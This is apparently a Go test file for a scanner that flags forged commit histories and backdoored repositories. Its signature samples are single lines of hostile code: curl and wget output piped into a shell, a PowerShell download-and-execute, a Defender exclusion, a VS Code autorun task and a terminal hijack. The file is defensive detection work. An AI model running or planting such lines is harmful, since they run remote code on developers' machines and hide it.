package scan

import (
	"regexp"
	"strings"
	"testing"

	"skarvel/internal/gitx"
)

func commit(name, email, localTime string) gitx.CommitMeta {
	return gitx.CommitMeta{
		SHA: "deadbeef", AuthorName: name, AuthorEmail: email, AuthorLocal: localTime,
	}
}

func TestOnTheHourUsesLocalNotUTC(t *testing.T) {
	// The generator that motivated this stamps a fixed *local* hour, so the
	// UTC instant differs per persona timezone while the wall clock does not.
	// Detecting on UTC alone would find one persona and miss the rest.
	cases := []struct {
		local string
		want  bool
	}{
		{"2026-06-25T12:00:00+05:00", true},
		{"2026-04-18T12:00:00+08:00", true},
		{"2026-02-19T12:00:00+04:00", true},
		{"2026-06-25T12:00:01+05:00", false},
		{"2026-06-25T12:01:00+05:00", false},
		{"2026-06-25T09:34:17Z", false},
		{"2024-12-14T23:00:00Z", true}, // any exact hour counts, not just noon
		{"", false},
		{"garbage", false},
	}
	for _, tc := range cases {
		got := commit("a", "a@b", tc.local).OnTheHour()
		if got != tc.want {
			t.Errorf("OnTheHour(%q) = %v, want %v", tc.local, got, tc.want)
		}
	}
}

func TestAtLocalHour(t *testing.T) {
	c := commit("a", "a@b", "2026-04-18T12:00:00+08:00")
	if !c.AtLocalHour(12) {
		t.Error("expected noon local to match hour 12")
	}
	if c.AtLocalHour(4) {
		t.Error("must compare local hour, not the UTC equivalent (04:00Z)")
	}
}

func TestSummariseIdentifiesForgedAuthors(t *testing.T) {
	commits := []gitx.CommitMeta{
		// A generated persona: every commit at the same local hour.
		commit("jackleeio", "280147597@qq.com", "2026-04-18T12:00:00+08:00"),
		commit("jackleeio", "280147597@qq.com", "2026-04-19T12:00:00+08:00"),
		commit("jackleeio", "280147597@qq.com", "2026-04-20T12:00:00+08:00"),
		// A real contributor with scattered times, including one that happens
		// to land on the hour -- which must not be enough to flag them.
		commit("Real Dev", "real@example.com", "2026-04-18T09:34:17+01:00"),
		commit("Real Dev", "real@example.com", "2026-04-18T14:02:51+01:00"),
		commit("Real Dev", "real@example.com", "2026-04-19T17:00:00+01:00"),
		commit("Real Dev", "real@example.com", "2026-04-20T11:47:03+01:00"),
	}

	var total int
	authors := summarise(commits, &total)

	if total != 4 {
		t.Errorf("total on-the-hour = %d, want 4", total)
	}
	if len(authors) != 2 {
		t.Fatalf("got %d authors, want 2", len(authors))
	}
	// Forged authors sort first so they lead the report.
	if !authors[0].Forged() || authors[0].Name != "jackleeio" {
		t.Errorf("expected jackleeio flagged and listed first, got %+v", authors[0])
	}
	if authors[0].TopHour != 12 || authors[0].TopHourCount != 3 {
		t.Errorf("top hour = %d (%d commits), want 12 (3)", authors[0].TopHour, authors[0].TopHourCount)
	}
	if authors[1].Forged() {
		t.Error("a real contributor with one coincidental on-the-hour commit was wrongly flagged")
	}
}

func TestForgedNeedsEnoughCommits(t *testing.T) {
	// Two commits both on the hour is a plausible coincidence; refusing to
	// flag it keeps single-commit repos out of the results.
	a := AuthorStat{Commits: 2, OnHour: 2}
	if a.Forged() {
		t.Error("2/2 should not be enough evidence to call an author forged")
	}
	if !(AuthorStat{Commits: 3, OnHour: 3}).Forged() {
		t.Error("3/3 should be flagged")
	}
	if (AuthorStat{Commits: 10, OnHour: 9}).Forged() {
		t.Error("9/10 is not all commits and must not be flagged")
	}
}

func TestVerdict(t *testing.T) {
	cases := []struct {
		name string
		r    RepoResult
		want string
	}{
		{"all forged", RepoResult{Commits: 229, OnHour: 229}, "FABRICATED"},
		{"too few to call", RepoResult{Commits: 4, OnHour: 4}, "SUSPECT"},
		{"majority forged", RepoResult{Commits: 100, OnHour: 80}, "SUSPECT"},
		{"organic but backdoored", RepoResult{
			Commits: 500, OnHour: 1,
			Hits: []Hit{{Severity: "high", Tier: TierStrong, Signature: "remote-eval"}},
		}, "MALICIOUS CONTENT"},
		{"only medium hits", RepoResult{
			Commits: 500, OnHour: 0,
			Hits: []Hit{{Severity: "medium", Tier: TierSupporting, Signature: "b64-https"}},
		}, "REVIEW"},
		{"clean", RepoResult{Commits: 500, OnHour: 2}, "clean"},
		{"empty", RepoResult{Commits: 0}, "EMPTY"},
	}
	for _, tc := range cases {
		if got := tc.r.Verdict(); got != tc.want {
			t.Errorf("%s: verdict = %q, want %q", tc.name, got, tc.want)
		}
	}
}

// A repository with genuine history but a planted payload must still be
// caught; the timestamp test alone would call it clean.
func TestContentAloneCanFlagAnOrganicRepo(t *testing.T) {
	r := RepoResult{Commits: 900, OnHour: 3, Hits: []Hit{
		{Severity: "high", Tier: TierStrong, Signature: "dynamic-require"},
	}}
	if r.ForgedRatio() > 0.01 {
		t.Fatal("fixture should look organic")
	}
	if r.Verdict() != "MALICIOUS CONTENT" {
		t.Errorf("verdict = %q, want MALICIOUS CONTENT", r.Verdict())
	}
}

func TestKnownInstallerIsDowngradedNotHidden(t *testing.T) {
	hits := downgradeKnownInstallers([]Hit{
		{Signature: "curl-pipe-shell", Severity: "high",
			Text: "curl -L https://foundry.paradigm.xyz | bash"},
		{Signature: "curl-pipe-shell", Severity: "high",
			Text: "curl -s https://codeprettier.pro/settings/linux | sh"},
	})
	if len(hits) != 2 {
		t.Fatalf("downgrading must not drop hits; got %d", len(hits))
	}
	if hits[0].Severity != "medium" {
		t.Errorf("known installer should be downgraded, got %q", hits[0].Severity)
	}
	if hits[1].Severity != "high" {
		t.Errorf("unknown host must stay high severity, got %q", hits[1].Severity)
	}
}

// signatureSamples holds one line per signature that the signature must match.
var signatureSamples = map[string]string{
	"ioc-domain":               `const api = 'https://www.ipregionchecker.org/api/ip-check-encrypted/3aeb34a35';`,
	"dynamic-require":          `const handler = new (Function.constructor)('require', r);`,
	"remote-eval":              `try { eval(data); } catch (_) {}`,
	"curl-pipe-shell":          `curl -s 'https://codeprettier.pro/settings/mac?flag=2' | sh`,
	"vscode-terminal-hijack":   `"terminal.integrated.profiles.linux":{"bash":{"args":["-c","wget -qO- https://x.pro | sh"]}}`,
	"defender-exclusion":       `Add-MpPreference -ExclusionPath "C:\Users\x\.vscode"`,
	"b64-https":                `"DEV_API_KEY": "aHR0cHM6Ly9pcHJlZ2lvbmNoZWNrZXIubmV0L2FwaQ=="`,
	"secret-header":            `headers: { 'x-secret-header': 'secret' }`,
	"dev-key-config":           `const s = atob(variable.DEV_API_KEY);`,
	"hidden-from-explorer":     `"files.exclude": { "**/node_modules": true, "**/.vscode": true, "**/.git": true }`,
	"whitespace-padding":       `{` + strings.Repeat(" ", 120) + `"terminal.integrated.defaultProfile.linux":"bash"`,
	"powershell-download-exec": `"iex(iwr 'https://gist.githubusercontent.com/cuda-toolkit/936835c.../raw/x.ps1' -UseBasicParsing)"`,
	"vscode-autorun-task":      `"runOptions": { "runOn": "folderOpen" }`,
	"hidden-window-exec":       `"-WindowStyle", "Hidden",`,
}

// Every shipped signature must compile and match the sample it was written
// for, so a typo cannot silently disable a detector.
func TestSignaturesCompileAndMatch(t *testing.T) {
	samples := signatureSamples

	for _, sig := range Signatures {
		re, err := regexp.Compile(sig.Pattern)
		if err != nil {
			t.Errorf("signature %q does not compile: %v", sig.Name, err)
			continue
		}
		sample, ok := samples[sig.Name]
		if !ok {
			t.Errorf("signature %q has no sample; add one so it stays covered", sig.Name)
			continue
		}
		if !re.MatchString(sample) {
			t.Errorf("signature %q did not match its own sample", sig.Name)
		}
	}
}

// benignLines is ordinary code that no signature may match.
var benignLines = []string{
	`const res = await fetch('https://api.github.com/users/octocat');`,
	`app.get('/health', (req, res) => res.json({ ok: true }));`,
	`import { evaluate } from './math';`,
	`console.log("requires a Function to run");`,
	`// eval is forbidden by our lint rules`,
	`const API_KEY = process.env.API_KEY;`,
	`"files.exclude": { "**/node_modules": true }`,
	`"runOn": "default"`,
	`Invoke-WebRequest -Uri $u -OutFile out.zip`,
	`"reveal": "always"`,
}

// Ordinary code must not trip the detectors.
func TestSignaturesDoNotMatchBenignCode(t *testing.T) {
	benign := benignLines
	for _, sig := range Signatures {
		re, err := regexp.Compile(sig.Pattern)
		if err != nil {
			continue
		}
		for _, line := range benign {
			if re.MatchString(line) {
				t.Errorf("signature %q false-positives on: %s", sig.Name, line)
			}
		}
	}
}

// Regression tests drawn from real scan output. The tiering exists because a
// lone `curl | sh` on developer tooling outranked a genuine backdoor.
func TestTieredVerdicts(t *testing.T) {
	cases := []struct {
		name string
		hits []Hit
		want string
	}{
		{
			// OpenCLI forks: a config listing installers for other CLIs.
			// Previously "MALICIOUS CONTENT"; must not outrank real findings.
			name: "lone curl-pipe-shell in tooling",
			hits: []Hit{
				{Signature: "curl-pipe-shell", Tier: TierSupporting, Path: "src/external-clis.yaml", Line: 39},
				{Signature: "curl-pipe-shell", Tier: TierSupporting, Path: "src/external-clis.yaml", Line: 40},
			},
			want: "REVIEW",
		},
		{
			// erik1o6/web3staking: real backdoor. The eval() now matches, so
			// this escalates on the strong tier rather than scraping REVIEW.
			name: "backdoor with remote-eval",
			hits: []Hit{
				{Signature: "secret-header", Tier: TierSupporting, Path: "server/controllers/orderController.js", Line: 81},
				{Signature: "remote-eval", Tier: TierStrong, Path: "server/controllers/orderController.js", Line: 84},
			},
			want: "MALICIOUS CONTENT",
		},
		{
			// variable.js: two distinct supporting signatures, same file.
			name: "two supporting signatures in one file",
			hits: []Hit{
				{Signature: "b64-https", Tier: TierSupporting, Path: "server/data/util/variable.js", Line: 2},
				{Signature: "dev-key-config", Tier: TierSupporting, Path: "server/data/util/variable.js", Line: 2},
			},
			want: "MALICIOUS CONTENT",
		},
		{
			// Same two signatures but spread across unrelated files is weaker.
			name: "supporting signatures spread across files",
			hits: []Hit{
				{Signature: "b64-https", Tier: TierSupporting, Path: "a.js", Line: 2},
				{Signature: "whitespace-padding", Tier: TierSupporting, Path: "b.min.js", Line: 1},
			},
			want: "REVIEW",
		},
		{
			name: "known IOC domain alone is conclusive",
			hits: []Hit{{Signature: "ioc-domain", Tier: TierDefinitive, Path: ".vscode/settings.json", Line: 1}},
			want: "MALICIOUS CONTENT",
		},
		{
			// A recognised installer is downgraded but still visible.
			name: "known installer alone",
			hits: []Hit{{Signature: "curl-pipe-shell (known installer)", Tier: TierSupporting, Path: ".gitpod.yml", Line: 6}},
			want: "REVIEW",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := RepoResult{Commits: 500, OnHour: 1, Hits: tc.hits}
			if got := r.Verdict(); got != tc.want {
				t.Errorf("verdict = %q, want %q", got, tc.want)
			}
		})
	}
}

// The pattern must match property access; eval(response.data) is the exact
// form used by the web3staking backdoor and was previously missed.
func TestRemoteEvalMatchesPropertyAccess(t *testing.T) {
	var pat string
	for _, s := range Signatures {
		if s.Name == "remote-eval" {
			pat = s.Pattern
		}
	}
	re := regexp.MustCompile(pat)

	for _, s := range []string{
		"eval(response.data);",
		"try { eval(data); } catch (_) {}",
		"eval( res.body )",
		"eval(r)",
	} {
		if !re.MatchString(s) {
			t.Errorf("should match: %s", s)
		}
	}
	for _, s := range []string{
		"evaluate(myThing)",
		"// eval is banned",
		"eval(userInput)",
	} {
		if re.MatchString(s) {
			t.Errorf("should NOT match: %s", s)
		}
	}
}

// Every signature must declare a tier, or it silently contributes nothing.
func TestAllSignaturesHaveTiers(t *testing.T) {
	for _, s := range Signatures {
		switch s.Tier {
		case TierDefinitive, TierStrong, TierSupporting:
		default:
			t.Errorf("signature %q has no valid tier (%q)", s.Name, s.Tier)
		}
	}
}
